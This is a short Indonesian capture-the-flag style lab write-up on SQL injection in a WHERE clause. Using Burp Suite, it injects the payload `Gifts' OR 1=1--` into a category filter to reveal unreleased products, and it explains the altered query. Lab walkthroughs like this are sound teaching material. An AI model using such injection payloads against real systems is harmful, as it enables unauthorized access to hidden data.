# Write-up: SQL Injection vulnerability in WHERE clause allowing retrieval of hidden data

## Langkah Penyelesaian

1. **Aktifkan Intercept di Burp Suite**

   * Buka lab, nyalakan **Intercept On** di Burp.
   * Pilih salah satu kategori produk, misalnya `Gifts`.
     <img width="479" height="98" alt="image" src="https://github.com/user-attachments/assets/37c052ad-9118-4535-b05d-81c28775f11c" />


2. **Kirim Request ke Repeater**

   * Request kategori akan tertangkap di Burp.
   * Klik kanan → **Send to Repeater** untuk lebih mudah modifikasi.
    <img width="438" height="43" alt="image" src="https://github.com/user-attachments/assets/dab8b7f2-f22e-4428-9227-ad202dff42b2" />


3. **Modifikasi Parameter**

   * Ubah URL pada Repeater, dari:

     ```
     /filter?category=Gifts
     ```
     <img width="336" height="94" alt="image" src="https://github.com/user-attachments/assets/848c5f6e-83e2-4055-bbbd-00c9446fc8a2" />


     menjadi:

     ```
     /filter?category=Gifts' OR 1=1--
     ```
<img width="381" height="60" alt="image" src="https://github.com/user-attachments/assets/e60df89d-f676-4c71-8fbb-eaf7865d7ee3" />


4. **Analisis Query**
   Payload di atas akan membuat query berubah dari:

   ```sql
   SELECT * FROM products WHERE category = 'Gifts' AND released = 1;
   ```

   menjadi:

   ```sql
   SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1;
   ```

   * `OR 1=1` → selalu true.
   * `--` → komentar, bagian `AND released=1` diabaikan.

5. **Eksekusi & Verifikasi**

   * Tekan **Send** di Repeater.
   * Halaman menampilkan **produk unreleased**.
   * Lab menampilkan pesan hijau:

     ```
     Congratulations, you solved the lab!
     ```
<img width="1147" height="497" alt="image" src="https://github.com/user-attachments/assets/7bd0a351-870f-4bee-8c3f-a6b06a787546" />

---

## Payload Final

```
/filter?category=Gifts' OR 1=1--
```

